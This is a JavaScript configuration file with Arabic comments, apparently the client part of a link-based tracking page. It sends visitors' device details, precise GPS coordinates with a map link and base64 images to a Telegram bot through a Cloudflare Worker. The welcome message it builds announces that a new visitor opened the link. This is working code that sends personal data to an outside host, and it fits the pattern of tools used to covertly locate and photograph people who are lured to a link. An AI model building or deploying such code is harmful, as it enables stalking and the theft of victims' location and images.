// config.js - ملف الإعدادات والتواصل مع Cloudflare Worker
// هذا الملف مسؤول عن إرسال البيانات إلى البوت عبر الـ Worker

const Config = {
  // ⚠️ غير هذا الرابط إلى رابط الـ Worker الخاص بك
  API_URL: "https://telegram.mustafaalomar911.workers.dev",

  // ==========================================
  // إرسال رسالة نصية إلى تيليغرام
  // ==========================================
  async sendMessage(text) {
    try {
      console.log('📤 إرسال رسالة نصية...');
      
      const res = await fetch(this.API_URL, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          action: "sendMessage",
          text: text
        })
      });

      const result = await res.json();
      
      if (result.ok) {
        console.log('✅ تم إرسال الرسالة بنجاح');
      } else {
        console.error('❌ فشل إرسال الرسالة:', result.error);
      }
      
      return result;
    } catch (error) {
      console.error('❌ خطأ في إرسال الرسالة:', error);
      return { ok: false, error: error.message };
    }
  },

  // ==========================================
  // إرسال صورة إلى تيليغرام
  // ==========================================
  async sendPhoto(base64Image, caption = "") {
    try {
      console.log('📸 إرسال صورة...');
      
      // تنظيف Base64 من أي بادئات (data:image/jpeg;base64,)
      let cleanBase64 = base64Image;
      if (cleanBase64.includes(',')) {
        cleanBase64 = cleanBase64.split(',')[1];
      }

      // التحقق من حجم الصورة (تيليغرام يقبل حتى 20MB)
      const sizeInMB = (cleanBase64.length * 0.75) / (1024 * 1024);
      if (sizeInMB > 20) {
        throw new Error(`حجم الصورة كبير جداً (${sizeInMB.toFixed(2)}MB). الحد الأقصى 20MB`);
      }
      
      console.log(`📏 حجم الصورة: ${sizeInMB.toFixed(2)}MB`);

      const res = await fetch(this.API_URL, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          action: "sendPhoto",
          image: cleanBase64,
          caption: caption
        })
      });

      const result = await res.json();
      
      if (result.ok) {
        console.log('✅ تم إرسال الصورة بنجاح');
      } else {
        console.error('❌ فشل إرسال الصورة:', result.error);
      }
      
      return result;
    } catch (error) {
      console.error('❌ خطأ في إرسال الصورة:', error);
      return { ok: false, error: error.message };
    }
  },

  // ==========================================
  // إرسال معلومات الجهاز والموقع
  // ==========================================
  async sendDeviceInfo(extra = {}) {
    try {
      console.log('📱 إرسال معلومات الجهاز...');
      
      // جمع معلومات الجهاز
      const deviceData = {
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
        screen: {
          width: window.screen.width,
          height: window.screen.height,
          colorDepth: window.screen.colorDepth
        },
        viewport: {
          width: window.innerWidth,
          height: window.innerHeight
        },
        url: window.location.href,
        referrer: document.referrer || 'مباشر',
        timestamp: new Date().toISOString(),
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        ...extra
      };

      const res = await fetch(this.API_URL, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          action: "deviceInfo",
          data: deviceData
        })
      });

      const result = await res.json();
      
      if (result.ok) {
        console.log('✅ تم إرسال معلومات الجهاز بنجاح');
      } else {
        console.error('❌ فشل إرسال معلومات الجهاز:', result.error);
      }
      
      return result;
    } catch (error) {
      console.error('❌ خطأ في إرسال معلومات الجهاز:', error);
      return { ok: false, error: error.message };
    }
  },

  // ==========================================
  // إرسال رسالة ترحيب مع معلومات الزائر
  // ==========================================
  async sendWelcomeMessage(locationData = null) {
    let message = '👤 <b>زائر جديد فتح الرابط!</b>\n\n';
    
    // إضافة وقت الزيارة
    const now = new Date();
    message += `🕐 <b>الوقت:</b> ${now.toLocaleString('ar-SA')}\n\n`;
    
    // إضافة معلومات الموقع إذا كانت متاحة
    if (locationData) {
      message += '📍 <b>معلومات الموقع:</b>\n';
      message += `• خط العرض: ${locationData.lat}\n`;
      message += `• خط الطول: ${locationData.lng}\n`;
      message += `• الدقة: ${Math.round(locationData.accuracy)} متر\n`;
      message += `• <a href="${locationData.mapUrl}">🗺 عرض على خرائط جوجل</a>\n\n`;
    } else {
      message += '📍 <b>الموقع:</b> غير متاح\n\n';
    }
    
    // إضافة معلومات المتصفح
    message += '🌐 <b>المتصفح:</b>\n';
    message += `• ${navigator.userAgent}\n\n`;
    
    // إضافة معلومات الشاشة
    message += '📱 <b>الشاشة:</b>\n';
    message += `• ${window.screen.width}x${window.screen.height}\n`;
    
    return await this.sendMessage(message);
  },

  // ==========================================
  // إرسال تقرير الأخطاء
  // ==========================================
  async sendErrorReport(errorMessage, errorDetails = {}) {
    const message = 
`❌ <b>تقرير خطأ</b>

🕐 <b>الوقت:</b> ${new Date().toLocaleString('ar-SA')}

📝 <b>الخطأ:</b>
${errorMessage}

📋 <b>تفاصيل إضافية:</b>
${JSON.stringify(errorDetails, null, 2)}`;

    return await this.sendMessage(message);
  },

  // ==========================================
  // اختبار الاتصال بالـ Worker
  // ==========================================
  async testConnection() {
    try {
      console.log('🔍 اختبار الاتصال بالـ Worker...');
      
      const result = await this.sendMessage('✅ <b>اختبار الاتصال</b>\nتم الاتصال بنجاح!');
      
      if (result.ok) {
        console.log('✅ الاتصال بالـ Worker ناجح');
        return true;
      } else {
        console.error('❌ فشل الاتصال بالـ Worker:', result.error);
        return false;
      }
    } catch (error) {
      console.error('❌ خطأ في اختبار الاتصال:', error);
      return false;
    }
  },

  // ==========================================
  // التحقق من صحة Base64
  // ==========================================
  isValidBase64(str) {
    try {
      // إزالة البادئة إذا وجدت
      let base64 = str;
      if (base64.includes(',')) {
        base64 = base64.split(',')[1];
      }
      
      // محاولة فك التشفير
      atob(base64);
      return true;
    } catch (e) {
      return false;
    }
  }
};

// ==========================================
// تصدير الكائن للاستخدام في الملفات الأخرى
// ==========================================
if (typeof module !== 'undefined' && module.exports) {
  module.exports = Config;
}
